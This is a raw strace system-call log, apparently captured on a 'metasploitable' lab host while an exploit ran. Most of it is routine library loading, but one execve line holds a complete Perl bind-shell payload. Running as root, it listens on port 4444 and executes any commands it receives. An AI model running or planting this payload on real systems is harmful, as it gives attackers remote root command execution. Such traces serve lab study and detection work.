8421  07:23:22.781701 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
8421  07:23:22.781728 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcc000
8421  07:23:22.781744 mmap2(0xb7dd4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dd4000
8421  07:23:22.781765 close(1)          = 0
8421  07:23:22.781782 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8421  07:23:22.781800 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
8421  07:23:22.781821 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8421  07:23:22.781966 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8421  07:23:22.781991 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc1000
8421  07:23:22.782007 mmap2(0xb7dca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dca000
8421  07:23:22.782027 close(1)          = 0
8421  07:23:22.782055 munmap(0xb7f7c000, 29913) = 0
8421  07:23:22.782076 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
8421  07:23:22.782127 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8421  07:23:22.782158 _llseek(1, 0, [0], SEEK_CUR) = 0
8421  07:23:22.782170 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
8421  07:23:22.782187 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f83000
8421  07:23:22.782198 _llseek(1, 1624, [1624], SEEK_SET) = 0
8421  07:23:22.782213 munmap(0xb7f83000, 1624) = 0
8421  07:23:22.782223 close(1)          = 0
8421  07:23:22.782252 getpgrp()         = 3831
8421  07:23:22.782263 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
8421  07:23:22.782278 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
8421  07:23:22.782295 brk(0x8101000)    = 0x8101000
8421  07:23:22.782327 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.782342 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.782360 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8421  07:23:22.782398 brk(0x8102000)    = 0x8102000
8421  07:23:22.782425 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8421  07:23:22.782444 stat64("/sbin/AB", 0xbfc9a2f8) = -1 ENOENT (No such file or directory)
8421  07:23:22.782456 stat64("/bin/AB", 0xbfc9a2f8) = -1 ENOENT (No such file or directory)
8421  07:23:22.782468 stat64("/usr/sbin/AB", 0xbfc9a2f8) = -1 ENOENT (No such file or directory)
8421  07:23:22.782480 stat64("/usr/bin/AB", 0xbfc9a2f8) = -1 ENOENT (No such file or directory)
8421  07:23:22.782493 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8421  07:23:22.782508 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7df76f8) = 8422
8422  07:23:22.782556 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8422  07:23:22.782572 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8422  07:23:22.782614 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8422  07:23:22.782630 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8422  07:23:22.782662 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8422  07:23:22.782678 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8422  07:23:22.782691 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8422  07:23:22.782749 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
8422  07:23:22.782764 --- SIGPIPE (Broken pipe) @ 0 (0) ---
8422  07:23:22.782835 exit_group(127)   = ?
8421  07:23:22.811739 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:23:22.811792 waitpid(8421,  <unfinished ...>
8421  07:23:22.811810 <... rt_sigprocmask resumed> NULL, 8) = 0
8421  07:23:22.811824 --- SIGCHLD (Child exited) @ 0 (0) ---
8421  07:23:22.811846 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 8422
8421  07:23:22.811870 waitpid(-1, 0xbfc99f78, WNOHANG) = -1 ECHILD (No child processes)
8421  07:23:22.811881 sigreturn()       = ? (mask now [])
8421  07:23:22.811904 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8421  07:23:22.811920 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.811931 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8421  07:23:22.811943 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8421  07:23:22.811961 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.811973 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8421  07:23:22.812009 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8421  07:23:22.812029 stat64("/sbin/perl", 0xbfc9a328) = -1 ENOENT (No such file or directory)
8421  07:23:22.812042 stat64("/bin/perl", 0xbfc9a328) = -1 ENOENT (No such file or directory)
8421  07:23:22.812054 stat64("/usr/sbin/perl", 0xbfc9a328) = -1 ENOENT (No such file or directory)
8421  07:23:22.812066 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8421  07:23:22.812084 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
8421  07:23:22.812110 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
8421  07:23:22.812125 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7df76f8) = 8423
8423  07:23:22.812206 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8423  07:23:22.812241 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
8423  07:23:22.812255 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
8423  07:23:22.812267 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
8423  07:23:22.812282 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8423  07:23:22.812298 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8423  07:23:22.812310 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
8423  07:23:22.812345 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
8423  07:23:22.812436 brk(0)            = 0x8153000
8423  07:23:22.812463 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.812479 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9c000
8423  07:23:22.812495 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.812514 open("/etc/ld.so.cache", O_RDONLY) = 1
8423  07:23:22.812527 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8423  07:23:22.812544 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f94000
8423  07:23:22.812555 close(1)          = 0
8423  07:23:22.812565 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.812581 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8423  07:23:22.812596 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8423  07:23:22.812721 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8423  07:23:22.812757 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f90000
8423  07:23:22.812769 mmap2(0xb7f92000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f92000
8423  07:23:22.812786 close(1)          = 0
8423  07:23:22.812797 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.812812 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
8423  07:23:22.812827 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
8423  07:23:22.812915 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
8423  07:23:22.812933 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f6b000
8423  07:23:22.812944 mmap2(0xb7f8e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f8e000
8423  07:23:22.812959 close(1)          = 0
8423  07:23:22.812971 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.812985 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
8423  07:23:22.813003 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
8423  07:23:22.813091 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
8423  07:23:22.813107 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f6a000
8423  07:23:22.813120 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f52000
8423  07:23:22.813131 mmap2(0xb7f66000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f66000
8423  07:23:22.813145 mmap2(0xb7f68000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f68000
8423  07:23:22.813160 close(1)          = 0
8423  07:23:22.813200 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.813215 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8423  07:23:22.813247 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8423  07:23:22.813336 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8423  07:23:22.813354 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e03000
8423  07:23:22.813366 mmap2(0xb7f4c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f4c000
8423  07:23:22.813381 mmap2(0xb7f4f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4f000
8423  07:23:22.813394 close(1)          = 0
8423  07:23:22.813406 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8423  07:23:22.813420 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
8423  07:23:22.813434 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
8423  07:23:22.813527 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
8423  07:23:22.813544 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd1000
8423  07:23:22.813555 mmap2(0xb7dda000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dda000
8423  07:23:22.813570 mmap2(0xb7ddc000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ddc000
8423  07:23:22.813583 close(1)          = 0
8423  07:23:22.813607 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd0000
8423  07:23:22.813620 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dd08c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8423  07:23:22.813712 mprotect(0xb7f4c000, 4096, PROT_READ) = 0
8423  07:23:22.813758 munmap(0xb7f94000, 29913) = 0
8423  07:23:22.813771 set_tid_address(0xb7dd0908) = 8423
8423  07:23:22.813781 set_robust_list(0xb7dd0910, 0xc) = 0
8423  07:23:22.813791 futex(0xbfc5b0f0, 0x81 /* FUTEX_??? */, 1) = 0
8423  07:23:22.813805 rt_sigaction(SIGRTMIN, {0xb7f562c0, [], SA_SIGINFO}, NULL, 8) = 0
8423  07:23:22.813818 rt_sigaction(SIGRT_1, {0xb7f56340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
8423  07:23:22.813831 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
8423  07:23:22.813844 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
8423  07:23:22.813863 uname({sys="Linux", node="metasploitable", ...}) = 0
8423  07:23:22.813911 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
8423  07:23:22.813957 brk(0)            = 0x8153000
8423  07:23:22.813967 brk(0x8174000)    = 0x8174000
8423  07:23:22.814011 getuid32()        = 0
8423  07:23:22.814021 geteuid32()       = 0
8423  07:23:22.814030 getgid32()        = 0
8423  07:23:22.814039 getegid32()       = 0
8423  07:23:22.814076 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7daf000
8423  07:23:22.814105 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
8423  07:23:22.814122 read(1, "\271\\I\320", 4) = 4
8423  07:23:22.814136 close(1)          = 0
8423  07:23:22.814154 time(NULL)        = 1495625002
8423  07:23:22.814241 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfc5adc0) = -1 ENOENT (No such file or directory)
8423  07:23:22.814260 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfc5adc0) = -1 ENOENT (No such file or directory)
8423  07:23:22.814273 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfc5adc0) = -1 ENOENT (No such file or directory)
8423  07:23:22.814289 stat64("/usr/local/lib/perl/5.8.7", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814301 stat64("/usr/local/share/perl/5.8.7", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814314 stat64("/usr/local/lib/perl/5.8.6", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814326 stat64("/usr/local/share/perl/5.8.6", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814338 stat64("/usr/local/lib/perl/5.8.4", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814349 stat64("/usr/local/share/perl/5.8.4", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814361 stat64("/usr/local/lib/perl/5.8.3", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814376 stat64("/usr/local/share/perl/5.8.3", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814388 stat64("/usr/local/lib/perl/5.8.2", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814400 stat64("/usr/local/share/perl/5.8.2", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814412 stat64("/usr/local/lib/perl/5.8.1", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814424 stat64("/usr/local/share/perl/5.8.1", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814436 stat64("/usr/local/lib/perl/5.8.0", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814447 stat64("/usr/local/share/perl/5.8.0", 0xbfc5af00) = -1 ENOENT (No such file or directory)
8423  07:23:22.814470 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5abf8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.814484 _llseek(0, 0, [0], SEEK_CUR) = 0
8423  07:23:22.814496 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5abf8) = -1 EBADF (Bad file descriptor)
8423  07:23:22.814507 _llseek(1, 0, 0xbfc5ac40, SEEK_CUR) = -1 EBADF (Bad file descriptor)
8423  07:23:22.814517 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5abf8) = -1 EINVAL (Invalid argument)
8423  07:23:22.814528 _llseek(2, 0, 0xbfc5ac40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8423  07:23:22.814538 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
8423  07:23:22.814551 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5acb8) = -1 ENOTTY (Inappropriate ioctl for device)
8423  07:23:22.814562 _llseek(1, 0, [0], SEEK_CUR) = 0
8423  07:23:22.814572 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
8423  07:23:22.814585 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
